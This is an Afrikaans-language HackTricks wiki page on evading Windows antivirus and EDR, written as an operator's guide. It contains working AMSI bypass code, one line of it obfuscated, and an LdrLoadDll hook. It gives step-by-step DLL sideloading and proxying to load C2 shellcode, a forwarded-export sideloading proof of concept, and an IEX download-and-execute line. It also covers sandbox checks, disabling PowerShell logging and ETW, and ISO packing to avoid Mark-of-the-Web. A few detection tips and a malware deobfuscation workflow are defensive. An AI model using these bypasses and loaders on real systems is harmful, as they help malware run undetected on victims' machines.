# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender te laat ophou werk deur ’n ander AV na te boots.
- [Skakel Defender af as jy admin is](basic-powershell-for-pentesters/README.md)

## **AV Evasie-metodologie**

Tans gebruik AV's verskillende metodes om te bepaal of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese analise, en vir die meer gevorderde EDR's, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende kwaadwillige strings of reekse bytes in ’n binaire of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan vang, aangesien hulle waarskynlik al ontleed en as kwaadwillig aangeteken is. Daar is ’n paar maniere om hierdie tipe opsporing te omseil:

- **Enkripsie**

As jy die binaire enkripteer, sal daar geen manier wees vir AV om jou program te herken nie, maar jy sal ’n soort loader nodig hê om die program te ontsleutel en in memory uit te voer.

- **Obfuskasie**

Soms hoef jy net ’n paar strings in jou binaire of script te verander om dit by AV verby te kry, maar dit kan tydrowend wees afhangend van wat jy probeer obfuskeer.

- **Aangepaste gereedskap**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit split die lêer basies in verskeie segmente en laat Defender elkeen individueel skandeer; op dié manier kan dit jou presies wys watter strings of bytes in jou binaire aangeteken word.

Ek beveel sterk aan jy kyk na hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binaire in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te ontsleutel en te lees, ’n minidump op LSASS te voer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te omseil.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dinamiese analise te omseil. AV's het ’n baie kort tyd om lêers te skandeer om nie die gebruiker se werkvloei te onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van die implementering.
- **Checking machine's resources** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelhede te kontroleer — nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy ’n kontrole op die rekenaar se domein doen om te sien of dit by die een wat jy gespesifiseer het pas; as dit nie pas nie, kan jou program eenvoudig afsluit.

Dit blyk dat Microsoft Defender se Sandbox se computername HAL9TH is, so jy kan vir die rekenaarnaam in jou malware kyk voordat dit detoneer; as die naam HAL9TH ooreenstem, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die teiken van sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, sal **publieke tools** uiteindelik **gedetect** word, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik laasgenoemde. Mimikatz is waarskynlik een van, indien nie die mees aangetekte stuk malware deur AV's en EDR's nie; al is die projek baie gaaf, is dit ook ’n nagmerrie om dit te gebruik wanneer jy om AV's wil werk — so soek net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads wysig vir evasion, maak seker om die **automatic sample submission** in Defender af te skakel, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die lang termyn evasion te bereik. As jy wil kyk of jou payload deur ’n spesifieke AV gedetect word, installeer dit op ’n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, prioritiseer altyd die gebruik van DLLs vir omseiling; uit my ervaring word DLL-lêers gewoonlik veel minder gedetect en ontleed, so dit is ’n baie eenvoudige truuk om in sekere gevalle detectie te vermy (as jou payload natuurlik ’n manier het om as ’n DLL te loop).

Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detectietempo van 4/26 op antiscan.me, terwyl die EXE payload ’n 7/26 detectietempo het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van ’n normale Havoc EXE payload vs ’n normale Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stealthed te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL-soekorde wat deur die loader gebruik word deur beide die slagofferprogramm en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan kyk na programme wat vatbaar is vir DLL Sideloading met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme binne "C:\Program Files\\" wat vatbaar is vir DLL hijacking en die DLL-lêers wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **explore DLL Hijackable/Sideloadable programs yourself**, hierdie tegniek is redelik stealthy as dit behoorlik gedoen word, maar as jy openbaar bekende DLL Sideloadable programme gebruik, kan jy maklik betrap word.

Net om 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie noodwendig jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat 'n program maak van die proxy (en malicious) DLL na die oorspronklike DLL deur, en behou sodoende die program se funksionaliteit terwyl dit in staat is om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: 'n DLL source code template, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 detection rate in [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **raai sterk aan** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer in-diepte te leer oor wat ons hier bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies export wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export entry 'n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows loader:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit vanuit die beskermde KnownDLLs namespace voorsien (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die directory van die module wat die forward resolution uitvoer, insluit.

Dit maak 'n indirekte sideloading primitive moontlik: vind 'n signed DLL wat 'n funksie export wat na 'n nie-KnownDLL module naam forwarded is, en plaas daardie signed DLL saam met 'n attacker-controlled DLL met presies dieselfde naam as die forwarded target module. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde directory, en voer jou DllMain uit.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit deur die normale soekorde opgelos.

PoC (kopieer-plak):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die forwarded function te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activeer die forward met 'n getekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (onderteken) loads the side-by-side `keyiso.dll` (onderteken)
- While resolving `KeyIsoSetAuditingInterface`, die loader volg die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ná `DllMain` reeds uitgevoer is 'n "missing API" fout

Hunting tips:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met tooling soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidaat te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdedigingsidees:
- Moniteer LOLBins (bv., rundll32.exe) wat gesigneerde DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van non-KnownDLLs met dieselfde basiese naam uit daardie gids
- Waarsku vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paadjies
- Handhaaf code-integriteitsbeleid (WDAC/AppLocker) en weier skryf+uitvoer in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode stilweg te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat-en-muisspeletjie; wat vandag werk, kan môre opgespoor word, so vertrou nooit net op een hulpmiddel nie — indien moontlik, probeer om verskeie evasion techniques aan mekaar te koppel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs lêers op skyf scan, so as jy op een of ander manier payloads direk in-memory kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirusoplossings toe om skriptgedrag te inspekteer deur script contents bloot te stel in 'n vorm wat beide ongeënkripteer en unobfuscated is.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop dat dit `amsi:` vooraan sit en dan die pad na die uitvoerbare lêer waarvan die skrip uitgevoer is, in hierdie geval, powershell.exe

Ons het geen lêer op skyf gelaat nie, maar is steeds in-memory gevang weens AMSI.

Boonop, vanaf **.NET 4.8**, word C# code ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` vir in-memory loading. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory uitvoering as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese deteksies werk, kan die wysiging van die skripte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

Echter, AMSI het die vermoë om scripts te unobfuscate selfs al het hulle verskeie lae, so obfuscation kan 'n slegte opsie wees, afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms hoef jy egter net 'n paar variabelname te verander en jy's klaar, so dit hang af van hoe erg iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs as 'n ongeprivilegieerde gebruiker. As gevolg van hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-scanning te ontduik.

**Forcing an Error**

Om die AMSI-initialisering te dwing om te misluk (amsiInitFailed) sal daartoe lei dat geen skandering vir die huidige proses geïnisieer sal word nie. Dit is oorspronklik bekendgemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell-kode geverg om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gevlag, so 'n wysiging is nodig om hierdie tegniek te gebruik.

Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie pos uitkom, so jy moet nie enige kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokkeer AMSI deur te verhoed dat amsi.dll gelaai word (LdrLoadDll hook)

AMSI word eers geïnitialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal‑onafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die versoekte module `amsi.dll` is. Gevolglik laai AMSI nooit en vind daar geen skanderings plaas vir daardie proses nie.

Implementasie-oorsig (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en custom loaders heen (enige iets wat andersins AMSI sou laai).
- Gebruik saam met die invoer van scripts oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Gesien gebruik deur loaders wat deur LOLBins uitgevoer word (bv., `regsvr32` wat `DllRegisterServer` aanroep).

Hierdie hulpmiddel [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) genereer ook 'n script om AMSI te omseil.

**Verwyder die gedetekte handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekte AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te skandeer vir die AMSI-handtekening en dit dan te oorskryf met NOP-instruksies, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou skripte uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:
```bash
powershell.exe -version 2
```
## PS-logboek

PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word, te log. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook 'n **probleem vir aanvallers wees wat deteksie wil ontduik**.

Om PowerShell-logboeking te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit ondersoek. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n unmanaged PowerShell-sessie te spawn sonder verdediging (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuskering

> [!TIP]
> Verskeie obfuskeringstegnieke berus op die enkripsie van data, wat die entropie van die binêr sal verhoog en dit vir AVs en EDRs makliker maak om dit op te spoor. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke afdelings van jou kode toe te pas wat sensitief is of weggesteek moet word.

### Deobfuskering van ConfuserEx-beskermde .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële afgeleides) gebruik, is dit algemeen om verskeie beskermingslae te tref wat dekompilers en sandbokse blokkeer. Die onderstaande werkvloei herstel betroubaar 'n byna–oorspronklike IL wat daarna na C# gedekompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering-verwydering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit pas ook die PE checksum aan, sodat enige wysiging die binêr sal laat ineenstort. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te vind, die XOR-sleutels te herstel en 'n skoon assembly te hertskenk:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/control-flow herstel – voer die *clean* lêer aan **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profiel  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlienaam herstel en konstante stringe dekripteer.

3.  Proxy-call verwydering – ConfuserEx vervang direkte metode-oproepe met liggewig omslagfunksies (a.k.a *proxy calls*) om dekompilering verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's te sien soos `Convert.FromBase64String` of `AES.Create()` in plaas van ondoorzichtige omslagfunksies (`Class8.smethod_10`, …).

4.  Handmatige skoonmaak – voer die onstaan­de binêr onder dnSpy uit, soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *regte* payload te vind. Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte-array wat binne `<Module>.byte_0` geïnitialiseer is.

Die bogenoemde ketting herstel die uitvoervloei **sonder** om die kwaadwillige monster uit te voer – nuttig wanneer jy op 'n offline werkstasie werk.

🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triageer.

#### Eenreël
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasiesuite te voorsien wat verhoogde sagteware-sekuriteit deur code obfuscation en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens saamsteltyd, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag obfuscated operations by wat deur die C++ template metaprogramming framework gegenereer word, wat die lewe van iemand wat die toepassing wil kraak 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie PE-lêers te obfuscateer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir ewekansige uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op die assemblertaalvlak deur gewone instruksies in ROP-kettings te transformeer, en sodoende ons natuurlike begrip van normale beheerstroom te ondermyn.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat seldsaam afgelaaide toepassings SmartScreen sal aktiveer, en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur te klik More Info -> Run anyway).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat uitvoerbare lêers wat met 'n **betroubare** ondertekeningssertifikaat onderteken is **nie SmartScreen sal aktiveer nie**.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om dit in 'n houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **non NTFS** volumes toegepas kan word.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitvoerhouers inpak om Mark-of-the-Web te omseil.

Voorbeeld van gebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo vir die omseil van SmartScreen deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeurtenisse te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te ontdek.

Soortgelyk aan hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die user-space proses dadelik te laat terugkeer sonder om enige gebeurtenisse te registreer. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat effektief ETW-logging vir daardie proses deaktiveer.

Jy kan meer inligting kry by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

